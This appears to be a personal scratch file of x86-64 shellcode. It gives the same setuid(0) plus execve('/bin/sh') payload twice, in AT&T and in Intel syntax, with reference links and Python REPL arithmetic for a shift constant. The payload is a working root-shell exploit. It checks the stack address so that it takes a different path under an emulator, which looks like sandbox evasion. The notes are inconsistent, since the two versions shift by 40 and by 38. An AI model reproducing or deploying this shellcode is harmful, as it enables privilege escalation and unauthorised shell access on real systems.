https://defuse.ca/online-x86-assembler.htm#disassembly
https://godbolt.org/
https://courses.engr.illinois.edu/cs225/fa2022/resources/stack-heap/
https://www.unicorn-engine.org/BHUSA2015-unicorn.pdf

.text
.globl _start

_start:
    mov $0x7fffffffffffffff,%rdi 
    shr $40,%rdi
    cmp %rsp,%rdi               # 0x700000 + 1024*1024 - 1
    je trash
    xor %rdi, %rdi                 # Zero out %rdi (first argument)
    push $0x69
    pop %rax                       # Set %rax to function number for setuid()
    syscall                        # setuid(0);
    push %rdi                      
    push %rdi
    pop %rsi                     
    pop %rdx                       # Null out %rdx and %rdx (second and third argument)  
    mov $0x68732f6e69622f6a,%rdi   # move 'hs/nib/j' into %rdi
    shr $0x8,%rdi                  # null truncate the backwards value to '\0hs/nib/'
    push %rdi      
    push %rsp 
    pop %rdi                       # %rdi is now a pointer to '/bin/sh\0'
    push $0x3b                     
    pop %rax                       # set %rax to function # for execve()
    syscall                        # execve('/bin/sh',null,null);
trash:
   mov $0x68732f6e69622f6a,%rdi 



_start:
 movabs rdi,0x7fffffffffffffff
 shr    rdi,0x26
 cmp    rdi,rsp
 je     trash
 xor    rdi,rdi
 push   0x69
 pop    rax
 syscall 
 push   rdi
 push   rdi
 pop    rsi
 pop    rdx
 movabs rdi,0x68732f6e69622f6a
 shr    rdi,0x8
 push   rdi
 push   rsp
 pop    rdi
 push   0x3b
 pop    rax
 syscall 
trash:
 movabs rdi,0x68732f6e69622f6a


 >>> bin(v)
'0b111111111111111111111110000000011111111111111111111111111111111'
>>> v = (k << 40) + 2**(len("00000000000000000000000000000000")+8)-1
>>> v
9223372036854775807
>>> bin(v)
'0b111111111111111111111111111111111111111111111111111111111111111'
>>> hex(v)
'0x7fffffffffffffff'
>>> v << 40
10141204801825835210874114015232
>>> v >> 40
8388607
>>> 